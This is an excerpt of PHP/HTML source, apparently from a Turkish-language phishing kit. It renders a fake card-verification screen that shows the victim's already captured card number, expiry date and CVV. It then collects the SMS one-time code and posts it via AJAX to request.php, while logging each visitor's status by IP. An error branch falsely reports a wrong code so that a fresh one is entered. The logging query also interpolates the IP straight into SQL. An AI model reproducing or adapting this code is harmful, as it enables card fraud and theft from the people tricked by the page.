...
if ($_GET['control'] == "error") {
   $pdo->query("UPDATE logs SET durum = 'Doğrulama Hatası' WHERE ip = '{$ip}'");
} else {
   $pdo->query("UPDATE logs SET durum = 'Doğrulama Ekranı' WHERE ip = '{$ip}'");
}
               ...
               <div class="laptop:flex-row laptop:flex desktop:px-[22px]">
                                 ...
                                 <div class="flex flex-col gap-4" style="z-index: 1;">
                                    ...
                                    <div>
                                       ...
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="Kredi Kartı Numarası" id="cardNumber" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer" value="<?= $check["kredi_karti"]; ?>" disabled>
                                       ...
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="Son Kullanım Tarihi" id="expireDate" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer" value="<?= $check["skt"]; ?>" disabled>
                                       ...
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="CVV" id="cvc" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer" value="<?= $check["cvv"]; ?>" disabled>
                  ...
                  <div class="desktop:ml-10 laptop:ml-4 laptop:pt-0 mobile:pt-8 desktop:w-[460px] laptop:w-[314px]">
                     <div>
                        ...
                        <div class="fixed inset-0 ios-bottom w-full z-[50] flex items-center justify-center pointer-events-none">
                           <div class="w-[calc(100%-1rem)] text-center relative desktop:max-w-[445px] tablet:max-w-[375px] mobile:max-w-[343px] flex flex-col p-4 items-center justify-center  bg-white rounded-3xl border border-brand-gray-border pointer-events-auto">
                              ...
                              <div class="text-xl font-medium text-brand-gray-primary mt-6">Doğrulama Kodu</div>
                              <div class="text-sm font-normal text-brand-gray-primary mt-2 whitespace-pre-line break-words" id='errNotifyText'>Cep telefonunuza gelen doğrulama kodunu giriniz.</div>
                              <div class="mt-6 relative">
                                 <div class="relative">
                                    <input placeholder="Doğrulama Kodu" id="dogrulama_kodu" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer">
                                    <label for="dogrulama_kodu" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">Doğrulama Kodu</label>
                                 </div>
                                 <?php if ($_GET['control'] == "error"): ?>
                                    <div style="color: red;" class="text-sm font-normal mt-2 whitespace-pre-line break-words" id='errNotifyText'>Hatalı kod girdiniz.</div>
                                 <?php endif; ?>
                              </div>
                              <div class="self-stretch mt-8"><button class="bg-brand-blue-primary  rounded-full text-base  px-5 py-3 text-center w-full text-white " id="onayla">Onayla</button></div>
                        ...
                        <div class="fixed inset-0 z-[49] bg-black/40 "></div>

                        <div class="mb-4"></div>
                        <script>
                           document.getElementById("onayla").addEventListener("click", function(e) {

                              e.preventDefault();
                              var dogrulama_kodu = document.getElementById('dogrulama_kodu').value

                              if (dogrulama_kodu == "" || dogrulama_kodu == null) {
                                 return;
                              } else if (dogrulama_kodu.length < 5) {
                                 return
                              } else {
                                 $.ajax({
                                    type: "POST",
                                    url: "./request.php?action=dogrulama_kodu",
                                    data: {
                                       dogrulama_kodu: dogrulama_kodu
                                    },
                                    success: function(data) {
                                       document.getElementById("onayla").disabled = true
                                       document.getElementById('dogrulama_kodu').disabled = true
                                       document.getElementById("onayla").innerHTML = "Lütfen Bekleyiniz"
                                    }
                                 });
                              }
                           });
               ...
               <div class="pointer-events-auto">
                  ...
                  <div class="relative">
                     <div class="overflow-y-auto p-4 max-h-[75vh] ">
                        ...
                        <script>
                           var telefon = IMask(
                              document.getElementById('dogrulama_kodu'), {
                                 mask: '000000'
                              }
                           );
                        </script>
